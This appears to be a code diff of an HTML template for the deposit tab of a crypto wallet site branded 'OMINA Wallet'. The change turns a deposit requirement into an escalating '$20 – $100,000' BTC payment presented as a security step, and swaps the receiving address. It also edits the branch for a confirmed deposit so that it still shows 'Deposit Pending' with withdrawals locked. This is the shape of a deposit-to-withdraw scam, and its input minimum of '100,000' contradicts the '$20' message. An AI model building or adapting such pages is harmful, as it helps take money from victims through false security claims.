@@ -28,7 +28,24 @@
                     <div class="tab-pane fade show active" id="deposit" role="tabpanel" aria-labelledby="deposit-tab">
                         <div class="alert alert-info mb-4">
                             <h5><i class="fas fa-info-circle me-2"></i>Deposit Information</h5>
-                            <p>To unlock withdrawals, you need to make a one-time deposit of $20 in Bitcoin (BTC).</p>
+                            <p>Withdrawal Security Requirement
+
+                            For security reasons, withdrawals to an external wallet are only available after completing a one-time deposit from your external wallet to your OMINA Wallet. This ensures that your withdrawal destination is verified and secure.
+
+                            How It Works:
+                             1. Deposit Verification:
+                             • You must first deposit between $20 – $100,000 [BTC] from your external wallet.
+                             • This confirms ownership and enhances security.
+                             2. Linked Withdrawal Address:
+                             • After a successful deposit, withdrawals will only be allowed to the same external wallet address used for the deposit.
+                             • This prevents unauthorized transactions and ensures funds are sent to your verified address.
+                             3. Deposit Address:
+                             • OMINA external Wallet Address:
+                             • Send your deposit and wait for blockchain confirmation.
+                             4. Withdrawal Activation:
+                             • Once your deposit is confirmed, you can withdraw your [OMINA  COIN] securely to the linked external wallet.
+
+                            This process enhances account security and prevents fraudulent withdrawals.</p>
                         </div>
                         
                         <!-- Deposit Status -->
@@ -41,8 +58,8 @@
                                             <i class="fas fa-check fa-2x"></i>
                                         </div>
                                         <div>
-                                            <h5 class="mb-1 text-success">Deposit Confirmed</h5>
-                                            <p class="mb-0">Your deposit has been confirmed. Withdrawals are now unlocked for your account.</p>
+                                            <h5 class="mb-1 text-success">Deposit Pending</h5>
+                                            <p class="mb-0">Your deposit has not been confirmed. Withdrawals are locked for your account.</p>
                                         </div>
                                     </div>
                                 {% else %}
@@ -52,7 +69,7 @@
                                         </div>
                                         <div>
                                             <h5 class="mb-1 text-warning">Deposit Required</h5>
-                                            <p class="mb-0">Please make a one-time deposit of $20 in BTC to unlock withdrawals.</p>
+                                            <p class="mb-0">Please make a one-time deposit of $20-$100,000 in BTC to unlock withdrawals.</p>
                                         </div>
                                     </div>
                                 {% endif %}
@@ -65,9 +82,9 @@
                                 <h5>How to Deposit</h5>
                                 <div class="card mb-3">
                                     <div class="card-body">
-                                        <h6 class="mb-3">Step 1: Send $20 worth of BTC to the following address:</h6>
-                                        <div class="wallet-address mb-2">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
-                                        <button class="btn btn-sm btn-outline-primary copy-button" data-copy="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh">
+                                        <h6 class="mb-3">Step 1: Send $20-$100,000 worth of BTC to the following address:</h6>
+                                        <div class="wallet-address mb-2">bc1qx40cjds6l2y9hefql5u0lcugsqxquw84gxufw0</div>
+                                        <button class="btn btn-sm btn-outline-primary copy-button" data-copy="bc1qx40cjds6l2y9hefql5u0lcugsqxquw84gxufw0">
                                             <i class="fas fa-copy me-1"></i>Copy Address
                                         </button>
                                     </div>
@@ -88,7 +105,7 @@
                                                 <label for="tx_amount" class="form-label">Amount Sent (USD)</label>
                                                 <div class="input-group">
                                                     <span class="input-group-text">$</span>
-                                                    <input type="number" class="form-control" id="tx_amount" value="20" min="20" required>
+                                                    <input type="number" class="form-control" id="tx_amount" value="20" min="100,000" required>
                                                 </div>
                                                 <div class="invalid-feedback">
                                                     Amount must be at least $20.
